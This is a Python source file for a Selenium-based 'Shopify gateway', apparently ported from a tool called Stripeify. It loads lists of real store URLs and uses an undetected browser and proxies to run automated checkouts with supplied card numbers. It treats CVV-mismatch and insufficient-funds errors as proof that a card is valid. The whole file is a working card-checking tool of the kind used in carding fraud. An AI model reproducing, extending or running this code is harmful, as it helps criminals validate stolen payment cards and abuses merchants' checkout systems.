"""
Shopify Selenium Gateway
Ported from Stripeify (Rust) to Python
Uses proven patterns: HTTP pre-screening, smart element finding, iframe handling
"""

import time
import random
import requests
from typing import Tuple, Optional, List, Dict
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
import undetected_chromedriver as uc


class ShopifySeleniumGateway:
    """
    Selenium-based Shopify gateway with Stripeify patterns
    
    Features:
    - HTTP pre-screening (filters dead gates fast)
    - Smart element finding (multiple selectors, retry logic)
    - Iframe switching (handles Stripe embeds)
    - Comprehensive success detection
    - Proxy support
    """
    
    def __init__(self, stores_file='valid_shopify_stores_urls_only.txt', proxy=None, headless=True):
        """
        Initialize gateway
        
        Args:
            stores_file: Path to file containing store URLs
            proxy: Optional proxy string (format: host:port:user:pass)
            headless: Run browser in headless mode
        """
        self.stores_file = stores_file
        self.stores = []
        self.proxy = proxy
        self.headless = headless
        self.driver = None
        self.failed_stores = set()
        
        # Load stores
        self._load_stores()
    
    def _load_stores(self):
        """Load stores from file"""
        try:
            with open(self.stores_file, 'r') as f:
                self.stores = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            print(f"✓ Loaded {len(self.stores)} stores")
        except Exception as e:
            print(f"✗ Failed to load stores: {e}")
            self.stores = []
    
    def _init_driver(self):
        """Initialize Chrome driver with options"""
        if self.driver:
            return
        
        try:
            options = uc.ChromeOptions()
            
            if self.headless:
                options.add_argument('--headless=new')
            
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            
            # Add proxy if provided
            if self.proxy:
                # Parse proxy
                parts = self.proxy.split(':')
                if len(parts) >= 2:
                    proxy_str = f"{parts[0]}:{parts[1]}"
                    options.add_argument(f'--proxy-server={proxy_str}')
            
            self.driver = uc.Chrome(options=options)
            self.driver.set_page_load_timeout(30)
            print("✓ Browser initialized")
            
        except Exception as e:
            print(f"✗ Failed to initialize browser: {e}")
            raise
    
    def _quit_driver(self):
        """Quit driver safely"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
    
    def http_prescreen_stores(self, stores: List[str], timeout: int = 3) -> List[str]:
        """
        Phase 1: HTTP pre-screening (FAST - filters 80% of dead gates)
        Ported from Stripeify's http_prescreen_gates function
        
        Args:
            stores: List of store URLs
            timeout: HTTP timeout in seconds
        
        Returns:
            List of accessible store URLs
        """
        print(f"\n🔍 Phase 1: HTTP pre-screening {len(stores)} stores (timeout: {timeout}s)...")
        
        accessible = []
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        for idx, store in enumerate(stores, 1):
            try:
                # Ensure URL has protocol
                url = store if store.startswith('http') else f'https://{store}'
                
                # Quick HTTP check
                response = session.get(url, timeout=timeout, allow_redirects=True)
                
                if response.status_code == 200:
                    text_lower = response.text.lower()
                    
                    # Check if it's actually a Shopify site
                    if any(keyword in text_lower for keyword in ['shopify', 'checkout', 'donate', 'donation', 'cart']):
                        print(f"  [{idx}/{len(stores)}] ✓ {store[:50]}")
                        accessible.append(store)
                    else:
                        print(f"  [{idx}/{len(stores)}] ✗ Not Shopify: {store[:50]}")
                else:
                    print(f"  [{idx}/{len(stores)}] ✗ HTTP {response.status_code}: {store[:50]}")
                    
            except requests.Timeout:
                print(f"  [{idx}/{len(stores)}] ⏱️  Timeout: {store[:50]}")
            except Exception as e:
                print(f"  [{idx}/{len(stores)}] ✗ Error: {store[:50]}")
        
        print(f"✓ Found {len(accessible)} accessible stores (filtered {len(stores) - len(accessible)} dead)")
        return accessible
    
    def wait_and_interact(self, selectors: List[str], action_fn, max_retries: int = 3, wait_time: int = 10):
        """
        Smart element finding with retry logic
        Ported from Stripeify's wait_and_interact function
        
        Args:
            selectors: List of CSS selectors to try
            action_fn: Function to perform on element (takes WebElement)
            max_retries: Maximum retry attempts
            wait_time: Wait timeout in seconds
        
        Returns:
            True if successful, False otherwise
        """
        for selector in selectors:
            for attempt in range(max_retries):
                try:
                    # Wait for element
                    element = WebDriverWait(self.driver, wait_time).until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    
                    # Scroll into view
                    self.driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                    time.sleep(0.3)
                    
                    # Perform action
                    action_fn(element)
                    return True
                    
                except (TimeoutException, NoSuchElementException):
                    if attempt < max_retries - 1:
                        time.sleep(1)
                        continue
                    break
                except Exception as e:
                    if attempt < max_retries - 1:
                        time.sleep(1)
                        continue
                    break
        
        return False
    
    def detect_result(self) -> Tuple[str, str]:
        """
        Comprehensive success detection
        Ported from Stripeify's try_donation result detection
        
        Returns:
            (status, message) tuple
            status: 'approved', 'declined', or 'error'
        """
        try:
            # Get current URL and page source
            current_url = self.driver.current_url.lower()
            page_source = self.driver.page_source.lower()
            
            # CVV mismatch indicators (most specific - check first)
            cvv_indicators = [
                'incorrect_cvc', 'invalid_cvc', 'incorrect cvc', 'invalid cvc',
                'security code is incorrect', 'security code is invalid',
                'cvv is incorrect', 'cvc is incorrect', 'cvv2 is incorrect',
                "card's security code is incorrect", 'card verification',
                'security code does not match', 'cvc does not match',
            ]
            
            for indicator in cvv_indicators:
                if indicator in page_source:
                    return 'approved', 'CVV_MISMATCH - Card is valid'
            
            # Insufficient funds
            insufficient_indicators = [
                'insufficient funds', 'insufficient_funds', 'not enough funds',
                'insufficient balance', 'card has insufficient funds',
            ]
            
            for indicator in insufficient_indicators:
                if indicator in page_source:
                    return 'approved', 'INSUFFICIENT_FUNDS - Card is valid'
            
            # Declined indicators
            declined_indicators = [
                'card was declined', 'card has been declined', 'payment declined',
                'transaction declined', 'declined by', 'card declined',
                'payment was declined', 'your card was declined',
                'do not honor', 'generic_decline', 'card_declined',
            ]
            
            for indicator in declined_indicators:
                if indicator in page_source:
                    return 'declined', 'Card declined by bank'
            
            # Success indicators (URL)
            success_url_indicators = [
                '/thank', '/success', '/complete', '/confirmation', '/receipt',
            ]
            
            url_indicates_success = any(indicator in current_url for indicator in success_url_indicators)
            
            # Success indicators (content)
            success_content_indicators = [
                'payment successful', 'donation successful', 'thank you for your donation',
                'your donation has been', 'donation received', 'payment received',
                'transaction successful', 'order confirmed', 'payment confirmed',
                'donation confirmed', 'contribution received', 'thank you for contributing',
            ]
            
            content_indicates_success = any(indicator in page_source for indicator in success_content_indicators)
            
            # Only return approved if we have strong evidence
            if url_indicates_success or content_indicates_success:
                # Double-check no error messages
                if not any(word in page_source for word in ['error', 'declined', 'failed']):
                    return 'approved', 'CHARGED - Payment successful'
            
            # Default to declined (safer than false positive)
            return 'declined', 'Payment declined or failed'
            
        except Exception as e:
            return 'error', f'Result detection error: {e}'
    
    def process_shopify_checkout(self, store_url: str, card_data: str) -> Tuple[str, str]:
        """
        Process complete Shopify checkout flow
        Simplified version - finds cheapest product and attempts checkout
        
        Args:
            store_url: Store URL
            card_data: Card in format "number|month|year|cvv"
        
        Returns:
            (status, message) tuple
        """
        try:
            # Parse card data
            parts = card_data.split('|')
            if len(parts) != 4:
                return 'error', 'Invalid card format'
            
            card_number, exp_month, exp_year, cvv = parts
            
            # Ensure URL has protocol
            if not store_url.startswith('http'):
                store_url = f'https://{store_url}'
            
            # Navigate to store
            print(f"  → Navigating to {store_url[:50]}...")
            self.driver.get(store_url)
            time.sleep(3)
            
            # Try to find and click first product
            print(f"  → Finding product...")
            product_selectors = [
                '.product-item a', '.product a', '[data-product] a',
                '.grid-product a', '.product-card a'
            ]
            
            if not self.wait_and_interact(product_selectors, lambda elem: elem.click()):
                return 'error', 'No products found'
            
            time.sleep(2)
            
            # Add to cart
            print(f"  → Adding to cart...")
            add_to_cart_selectors = [
                'button[name="add"]', 'input[name="add"]', 
                'button[type="submit"]', '.add-to-cart',
                '#add-to-cart', '[data-add-to-cart]'
            ]
            
            if not self.wait_and_interact(add_to_cart_selectors, lambda elem: elem.click()):
                return 'error', 'Could not add to cart'
            
            time.sleep(2)
            
            # Go to checkout
            print(f"  → Going to checkout...")
            checkout_selectors = [
                '.cart__checkout', 'button[name="checkout"]',
                'a[href*="checkout"]', '.checkout-button',
                '#checkout', '[data-checkout]'
            ]
            
            if not self.wait_and_interact(checkout_selectors, lambda elem: elem.click()):
                # Try direct checkout URL
                self.driver.get(f"{store_url}/checkout")
                time.sleep(3)
            
            # Check for login requirement
            if 'login' in self.driver.current_url.lower():
                return 'error', 'Login required'
            
            # Fill email
            print(f"  → Filling checkout form...")
            email_selectors = ['input[type="email"]', 'input[name*="email"]', '#email']
            self.wait_and_interact(
                email_selectors,
                lambda elem: (elem.clear(), elem.send_keys('test@example.com'))
            )
            
            # Fill shipping (basic)
            self.wait_and_interact(
                ['input[name*="firstName"]', 'input[id*="firstName"]'],
                lambda elem: (elem.clear(), elem.send_keys('John'))
            )
            
            self.wait_and_interact(
                ['input[name*="lastName"]', 'input[id*="lastName"]'],
                lambda elem: (elem.clear(), elem.send_keys('Doe'))
            )
            
            self.wait_and_interact(
                ['input[name*="address"]', 'input[id*="address"]'],
                lambda elem: (elem.clear(), elem.send_keys('123 Main St'))
            )
            
            self.wait_and_interact(
                ['input[name*="city"]', 'input[id*="city"]'],
                lambda elem: (elem.clear(), elem.send_keys('New York'))
            )
            
            self.wait_and_interact(
                ['input[name*="zip"]', 'input[id*="postal"]'],
                lambda elem: (elem.clear(), elem.send_keys('10001'))
            )
            
            time.sleep(2)
            
            # Check for Stripe iframe
            print(f"  → Filling payment...")
            iframe_selectors = ['iframe[name*="stripe"]', 'iframe[src*="stripe"]']
            in_iframe = False
            
            for selector in iframe_selectors:
                try:
                    iframe = self.driver.find_element(By.CSS_SELECTOR, selector)
                    self.driver.switch_to.frame(iframe)
                    in_iframe = True
                    
                    # Fill card in iframe
                    self.wait_and_interact(
                        ['input[name="cardnumber"]', 'input[placeholder*="Card"]'],
                        lambda elem: (elem.click(), time.sleep(0.5), elem.send_keys(card_number))
                    )
                    
                    self.wait_and_interact(
                        ['input[name="exp-date"]', 'input[placeholder*="MM"]'],
                        lambda elem: (elem.click(), elem.send_keys(f"{exp_month}{exp_year[2:]}"))
                    )
                    
                    self.wait_and_interact(
                        ['input[name="cvc"]', 'input[placeholder*="CVC"]'],
                        lambda elem: (elem.click(), elem.send_keys(cvv))
                    )
                    
                    self.driver.switch_to.default_content()
                    break
                    
                except:
                    continue
            
            # If not in iframe, fill directly
            if not in_iframe:
                card_selectors = [
                    'input[name*="card"]', 'input[id*="card"]',
                    'input[autocomplete="cc-number"]'
                ]
                self.wait_and_interact(
                    card_selectors,
                    lambda elem: (elem.clear(), elem.send_keys(card_number))
                )
                
                self.wait_and_interact(
                    ['input[name*="month"]', 'select[name*="month"]'],
                    lambda elem: (elem.clear(), elem.send_keys(exp_month))
                )
                
                self.wait_and_interact(
                    ['input[name*="year"]', 'select[name*="year"]'],
                    lambda elem: (elem.clear(), elem.send_keys(exp_year))
                )
                
                self.wait_and_interact(
                    ['input[name*="cvv"]', 'input[name*="cvc"]'],
                    lambda elem: (elem.clear(), elem.send_keys(cvv))
                )
            
            time.sleep(1)
            
            # Submit payment
            print(f"  → Submitting payment...")
            submit_selectors = [
                'button[type="submit"]', 'input[type="submit"]',
                '#submit', '#pay-button', '.submit-button'
            ]
            
            self.wait_and_interact(submit_selectors, lambda elem: elem.click())
            
            # Wait for result
            print(f"  → Waiting for result...")
            time.sleep(8)
            
            # Detect result
            return self.detect_result()
            
        except Exception as e:
            return 'error', f'Checkout error: {e}'
    
    def check(self, card_data: str, max_stores: int = 5) -> Tuple[str, str, str]:
        """
        Check card with automatic store selection and fallback
        
        Args:
            card_data: Card in format "number|month|year|cvv"
            max_stores: Maximum stores to try
        
        Returns:
            (status, message, card_type) tuple
        """
        try:
            # Initialize driver
            self._init_driver()
            
            # Get available stores (exclude failed)
            available_stores = [s for s in self.stores if s not in self.failed_stores]
            
            if not available_stores:
                return 'error', 'No available stores', 'Unknown'
            
            # Phase 1: HTTP pre-screen (fast)
            accessible_stores = self.http_prescreen_stores(available_stores[:max_stores * 3], timeout=3)
            
            if not accessible_stores:
                return 'error', 'No accessible stores found', 'Unknown'
            
            # Phase 2: Try stores with Selenium
            print(f"\n🔍 Phase 2: Testing {min(max_stores, len(accessible_stores))} stores with Selenium...")
            
            for idx, store in enumerate(accessible_stores[:max_stores], 1):
                print(f"\n[{idx}/{min(max_stores, len(accessible_stores))}] Testing: {store}")
                
                try:
                    status, message = self.process_shopify_checkout(store, card_data)
                    
                    if status in ['approved', 'declined']:
                        # Determine card type
                        card_number = card_data.split('|')[0]
                        if card_number.startswith('4'):
                            card_type = 'Visa'
                        elif card_number.startswith('5'):
                            card_type = 'Mastercard'
                        elif card_number.startswith('3'):
                            card_type = 'Amex'
                        else:
                            card_type = 'Unknown'
                        
                        print(f"  ✓ Result: {status} - {message}")
                        return status, f"{message} | Store: {store}", card_type
                    else:
                        print(f"  ✗ Error: {message}")
                        self.failed_stores.add(store)
                        
                except Exception as e:
                    print(f"  ✗ Exception: {e}")
                    self.failed_stores.add(store)
                    continue
                
                time.sleep(2)
            
            return 'error', 'All stores failed', 'Unknown'
            
        finally:
            self._quit_driver()


if __name__ == "__main__":
    print("="*70)
    print("SHOPIFY SELENIUM GATEWAY TEST")
    print("="*70)
    
    # Test with working_shopify_stores.txt
    gateway = ShopifySeleniumGateway(
        stores_file='working_shopify_stores.txt',
        headless=False  # Visible for debugging
    )
    
    # Test card
    test_card = "4111111111111111|12|25|123"
    
    print(f"\nTesting card: {test_card[:4]}...{test_card[-7:]}")
    print()
    
    status, message, card_type = gateway.check(test_card, max_stores=3)
    
    print(f"\n{'='*70}")
    print(f"RESULT:")
    print(f"  Status: {status}")
    print(f"  Message: {message}")
    print(f"  Card Type: {card_type}")
    print(f"{'='*70}")
